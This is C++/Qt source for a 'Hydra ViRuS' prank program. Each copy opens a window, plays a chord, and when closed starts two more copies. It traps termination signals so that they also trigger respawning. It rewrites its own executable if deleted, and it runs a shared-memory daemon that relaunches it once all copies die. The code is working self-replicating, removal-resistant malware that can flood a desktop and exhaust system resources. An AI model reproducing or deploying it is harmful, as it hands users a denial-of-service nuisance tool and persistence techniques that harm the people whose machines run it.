// QT
#include <QtWidgets/QtWidgets>
#include <QtWidgets/QApplication>
#include <QtWidgets/QWidget>
#include <QtWidgets/QPushButton>
#include <QtWidgets/QBoxLayout>
#include <QtGui/QPixmap>
#include <QtGui/QScreen>
#include <QtCore/QProcess>
#include <QtCore/QFile>
#include <QtCore/QFileDevice>
#include <QtCore/QSharedMemory>

// SFML
#include <SFML/Audio/Music.hpp>

// Standard
#include <stdint.h>
#include <ctime>
#include <iostream>
#include <iomanip>
#include <cstdlib>
#include <cstring>

// Graphic and sound
#include "assets.h"

#ifdef __unix__
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#endif

#ifdef _WIN32
#include <windows.h>
#endif

#define WIN_WIDTH 400
#define WIN_HEIGHT 100
//#define MAX_NUM_PIDS 100000
#define MAX_NUM_PIDS 200
#define SEGMENT_SZ (MAX_NUM_PIDS*8) // Each pid is int64_t

QFile exe_file;
QByteArray exe_data;
int perms;
long daemon_pid;

// Since we may launch multiple times a second, we need something just a bit
// more random than std::time()
int os_get_random() {
#ifdef __unix__
  return getpid() + clock();
#endif

#ifdef _WIN32
  return (GetTickCount()%99999) + std::time(NULL);
#endif

  return std::time(NULL);
}

void os_sleep(long ms) {
#ifdef __unix__
  usleep(ms*1000);
#endif

#ifdef _WIN32
  Sleep(ms);
#endif
  return;
}

int64_t os_get_pid() {
#ifdef __unix__
  return (int64_t)getpid();
#endif

#ifdef _WIN32
  return (int64_t)GetCurrentProcessId();
#endif
}

static void button_response() {
  QApplication::quit();
}

void print_segment_as_hex(QSharedMemory *s) {
  s->lock();
  unsigned char *data = (unsigned char*)s->data();
  int i=0;
  while (i < s->size()) {
    for (int j=0;j<32;j++) {
      std::cout << std::setw(2) << std::hex << (int)data[i] << ' ';
      i++;
    }
    std::cout << std::endl;
  }
  s->unlock();
}

void print_segment_as_long(QSharedMemory *s) {
  int64_t *data = (int64_t*)s->data(); // 8 bytes
  for (int i=0;i<s->size()/8; i++)
    std::cout << data[i] << std::endl;
}


bool proc_is_alive(long pid) {
#ifdef __unix__
  kill(pid, 0);
  if (errno == ESRCH) {
    errno = 0;
    return false;
  }
#endif

#ifdef _WIN32
  HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
  if (proc == NULL)
    return false;
  CloseHandle(proc);
#endif
  return true;
}

bool at_least_one_proc_alive(QSharedMemory *s) {

  int64_t *shmem = (int64_t*)s->data();

  for (int i=0;i<MAX_NUM_PIDS;i++) {

    if (shmem[i] == 0)
      return false;

    if (proc_is_alive(shmem[i]) == true)
      return true;
  }
}

void deamon_loop() {

  QSharedMemory segment(QString::number(os_get_pid()));
  bool result = segment.create(SEGMENT_SZ, QSharedMemory::ReadWrite);
  std::cout << "s suze: " << segment.size() << std::endl;
  result = segment.attach(QSharedMemory::ReadWrite);
  //segment.unlock();

  // Pass to argv[1] this "daemons" PID
  std::cout << "daemon is pid " << os_get_pid() << std::endl;

  print_segment_as_hex(&segment);

  QStringList args;
  args << QString::number(os_get_pid());
  QProcess::startDetached(exe_file.fileName(), args);

  while (true) {
    os_sleep(1);
    int64_t *shmem = (int64_t*)segment.data();
    segment.lock();
    //print_segment_as_long(&segment);
    //print_segment_as_hex(&segment);
    //std::cout << "--" << std::endl;

    if (shmem[0] != 0 && !at_least_one_proc_alive(&segment)) {
      std::memset(shmem, 0, SEGMENT_SZ);
      QProcess::startDetached(exe_file.fileName(), args);
    }

    /*for (int i=0;i<MAX_NUM_PIDS;i++) {
      if (shmem[i] == 0)
        break;
      std::cout << shmem[i] << " -> dead? -> " << proc_is_alive(shmem[i])  << std::endl;
    }*/
    segment.unlock();
  }

}

void append_to_shmem(QString key) {
  QSharedMemory segment(key);
  segment.attach(QSharedMemory::ReadWrite);

  int64_t *shmem = (int64_t*)segment.data();
  segment.lock();

  for (int i=0;i<MAX_NUM_PIDS;i++) {
    if (shmem[i] == 0) {
      shmem[i] = os_get_pid(); // Register our PID
      segment.unlock();
      return;
    }
  }
  segment.unlock();

  /* Somehow, we overran MAX_NUM_PIDS... 
   * This means that either: 
   *  * MAX_NUM_PIDS wasn't set high enough, 
   *  * They have A LOT of RAM/CPU to spare,
   *  * shmem was not zeroed out (is this possible?)
   * in any case, their desktop surely has too many Hydras :)
   */
  exit(1);
}

void spawn_two_more() {

  QString exe_name = exe_file.fileName();

  if (!exe_file.exists()) {
    QFile out_stream(exe_name);
    out_stream.open(QIODevice::WriteOnly);
    out_stream.write(exe_data);
    out_stream.setPermissions((QFileDevice::Permissions)perms);
    out_stream.close();
  }

  // Daemon isn't dead, so start a new hydra with its PID
  if (proc_is_alive(daemon_pid)) {
    QStringList args;
    args << QString::number(daemon_pid);
    QProcess::startDetached(exe_name, args);
    QProcess::startDetached(exe_name, args);
  }
  else  {
    std::cout << "Daemon was killed?!?" << std::endl;
    QProcess::startDetached(exe_name);
  }
}

void spawn_wrapper(int i) {
  spawn_two_more();
}

void trap_setup() {
#ifdef __unix__
  signal(SIGTERM, spawn_wrapper);
  signal(SIGINT, spawn_wrapper);
  signal(SIGQUIT, spawn_wrapper);
  signal(SIGKILL, spawn_wrapper);
  signal(SIGHUP, spawn_wrapper);
#endif

#ifdef _WIN32
  //TODO
#endif
  return;
}

int main(int argc, char* argv[])  {

  exe_file.setFileName(argv[0]);
  std::cout << "argc " << argc << std::endl;

  // No PID in argv, so start daemon mode
  if (argc <= 1) {
    deamon_loop();
    return 0;
  }

  daemon_pid = atol(argv[1]);
  trap_setup();

  append_to_shmem(QString::number(daemon_pid));

  // Read in the executable file, in case they try to delete it
  exe_file.open(QIODevice::ReadOnly);
  perms = exe_file.permissions();
  exe_data = exe_file.readAll();

  QApplication::setStyle(QStyleFactory::create("Windows"));
  QApplication app(argc, argv);

  QWidget window(NULL, Qt::Window);
  window.setWindowModality(Qt::ApplicationModal);
  window.setFixedSize(WIN_WIDTH, WIN_HEIGHT);

  // Setup and play Audio
  sf::Music *music = new sf::Music;
  music->openFromMemory(chord_ogg, CHORD_LENGTH);
  //music->setVolume(100);
  music->play();
  //QApplication::beep();

  // Setup layouts
  QBoxLayout layout(QBoxLayout::TopToBottom);
  QBoxLayout row1(QBoxLayout::LeftToRight);
  QBoxLayout row2(QBoxLayout::LeftToRight);
  layout.setSpacing(0);
  row1.setSpacing(0);
  row2.setSpacing(0);

  // Create hydra icon
  QLabel image(&window);
  image.setPixmap(QPixmap(hydra_xpm));
  image.move(10,10);

  // Create message text
  QLabel text("Cut off a head, two more will take its place.\n[ Hydra ViRuS ]");
  text.setAlignment(Qt::AlignHCenter |  Qt::AlignVCenter);

  // Create the button
  QPushButton button;
  button.setFixedSize(96, 26);
  button.setDefault(true);
  button.setText("OK");

  // Put the Window somewhere random on the desktop
  QRect screen = QApplication::desktop()->availableGeometry();
  std::srand(os_get_random());
  int spawn_x = std::rand()%(screen.width() - WIN_WIDTH);
  int spawn_y = std::rand()%(screen.height() - WIN_HEIGHT);
  window.setGeometry(spawn_x, spawn_y, WIN_WIDTH, WIN_HEIGHT);

  // Glue everything together
  row1.addWidget(&text, Qt::AlignLeft);
  row2.addWidget(&button, Qt::AlignHCenter);
  layout.addLayout(&row1);
  layout.addLayout(&row2);
  QObject::connect(&button, &QPushButton::clicked, button_response);

  // Start
  window.setLayout(&layout);
  window.show();
  app.exec();

  delete music;

  // Evil
  spawn_two_more();

  return 0;
}
